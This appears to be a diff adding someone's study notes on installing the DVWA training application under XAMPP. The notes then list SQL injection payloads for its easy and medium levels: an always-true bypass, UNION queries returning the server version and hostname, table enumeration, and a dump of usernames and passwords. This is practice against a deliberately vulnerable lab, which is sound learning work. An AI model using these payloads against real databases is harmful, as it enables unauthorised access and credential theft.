@@ -1,0 +1,28 @@
+git clone https://github.com/digininja/DVWA.git
+
+xampp/htdocs/dvwa/config:(location)
+          config.inc.php.dict -> copy & rename to config.inc(php source file)
+          In php change 3rd = 'root' , 4th = ''
+
+start to apache,mysql in xampp: 
+          In chrome: localhost/dvwa/setup.php
+
+SQL INJECTIOJN
+
+easy:
+
+1' OR '1'='1'#
+
+'UNION SELECT null, @@version#
+
+'UNION SELECT null, @@hostname#
+
+?id=a' UNION SELECT "text1","text2";-- -&Submit=Submit.
+
+medium:
+
+1 OR 1=1
+
+1 or 1=1 union select null, table_name from information_schema.tables#
+
+1 OR 1=1 UNION SELECT user,password FROM users#
